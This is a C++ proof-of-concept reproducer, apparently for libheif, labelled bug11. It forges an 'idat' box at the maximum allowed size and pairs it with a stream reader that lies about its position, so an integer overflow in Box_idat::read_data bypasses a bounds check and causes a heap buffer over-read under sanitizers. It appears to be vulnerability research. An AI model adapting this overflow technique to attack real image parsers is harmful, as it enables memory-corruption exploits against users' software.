// bug11 — (uint64_t)m_data_start_pos + get_box_size() overflow.
//
// The parse path uses StreamReader::get_position() to set m_data_start_pos.
// We supply a custom StreamReader that lies about its position (returns a
// value near UINT64_MAX) while still serving box-header reads. The idat
// box-size is set to MAX_LARGE_BOX_SIZE (passes the check at box.cc:261)
// but combined with the lied position, the addition wraps inside
// Box_idat::read_data at box.cc:4118.

#include <cstdio>
#include <cstdint>
#include <cstring>
#include <memory>
#include <vector>

#include "bitstream.h"
#include "box.h"
#include "security_limits.h"

// Custom reader that:
//  - lies about position (so m_data_start_pos becomes huge during parse)
//  - lies about length (so subsequent reads don't bounds-check, exposing OOB)
//  - actual backing buffer is small (real_size bytes); m_pos may walk past
class LyingPositionReader : public StreamReader {
public:
  LyingPositionReader(const uint8_t* data, size_t real_size, uint64_t lie_offset)
    : m_data(data), m_real_size(real_size), m_lie(lie_offset) {}
  uint64_t get_position() const override { return m_lie + m_pos; }
  StreamReader::grow_status wait_for_file_size(uint64_t) override {
    return StreamReader::grow_status::size_reached;
  }
  bool read(void* dst, size_t n) override {
    // Lie: pretend the stream is huge. memcpy from real_buf + m_pos will
    // OOB when m_pos passes real_size → ASAN flags.
    std::memcpy(dst, m_data + m_pos, n);
    m_pos += n;
    return true;
  }
  bool seek(uint64_t pos) override {
    if (pos < m_lie) return false;
    m_pos = pos - m_lie;
    return true;
  }
private:
  const uint8_t* m_data;
  size_t m_real_size;
  uint64_t m_lie;
  uint64_t m_pos = 0;
};

// Forge an idat box: size=1, type="idat", largesize=MAX_LARGE_BOX_SIZE,
// then 16 bytes of payload — passes the security check at box.cc:261.
static std::vector<uint8_t> forge_idat_at_max_size() {
  std::vector<uint8_t> b;
  for (int i = 24; i >= 0; i -= 8) b.push_back((uint8_t)((1u >> i) & 0xFF));
  const char* t = "idat";
  for (int i = 0; i < 4; i++) b.push_back((uint8_t)t[i]);
  uint64_t largesize = (uint64_t)MAX_LARGE_BOX_SIZE;          // exactly the cap
  for (int i = 56; i >= 0; i -= 8) b.push_back((uint8_t)((largesize >> i) & 0xFF));
  for (int i = 0; i < 16; i++) b.push_back((uint8_t)i);
  return b;
}

int main() {
  auto buf = forge_idat_at_max_size();
  // Lie about position so parse records m_data_start_pos near UINT64_MAX.
  uint64_t lie_offset = 0xFFFFFFFFFFFFFF00ULL;
  // The reader's actual backing buffer is `buf.size()`; reads past that
  // are now unbounded inside the reader (intentional — to expose the OOB).
  auto reader = std::make_shared<LyingPositionReader>(buf.data(), buf.size(),
                                                      lie_offset);
  // Use a huge BitstreamRange size — but stay below INT64_MAX so the
  // (int64_t)range.get_remaining_bytes() cast at box.cc:973 stays positive
  // and the size sanity check passes for our MAX_LARGE_BOX_SIZE-ish payload.
  BitstreamRange range(reader, /*length=*/(size_t)INT64_MAX);

  std::shared_ptr<Box> generic;
  heif_security_limits limits = *heif_get_global_security_limits();
  Error err = Box::read(range, &generic, &limits);
  std::fprintf(stderr,
               "[bug11] Box::read err.code=%d sub=%d msg=\"%s\" type=%s box_size=%llu\n",
               (int)err.error_code, (int)err.sub_error_code,
               err.message.c_str(),
               generic ? generic->get_type_string().c_str() : "(null)",
               generic ? (unsigned long long)generic->get_box_size() : 0ULL);
  auto idat = std::dynamic_pointer_cast<Box_idat>(generic);
  if (!idat) {
    std::fprintf(stderr, "[bug11] not idat — abort\n");
    return 0;
  }

  // Now (uint64_t)m_data_start_pos + get_box_size()
  //   ≈ 0xFFFFFFFFFFFFFF10 + 0x0FFFFFFFFFFFFFFF
  //   = 0x10FFFFFFFFFFFFF0F → overflows uint64_t.
  // UBSAN will fire on the addition at box.cc:4118.
  std::vector<uint8_t> dest;
  // The audited expression `start > (uint64_t)m_data_start_pos + get_box_size()`
  // wraps to 0x0FFFFFFFFFFFFFEF; with start=1 the false comparison lets us
  // through.  length=64 then drives the read past the actual backing buffer
  // (which is only `buf.size()` bytes) → ASAN heap-buffer-overflow on the
  // subsequent memcpy in StreamReader::read.
  Error e = idat->read_data(reader, /*start=*/1, /*length=*/64, dest, &limits);
  std::fprintf(stderr, "[bug11] survived: err=\"%s\"\n", e.message.c_str());
  return 0;
}
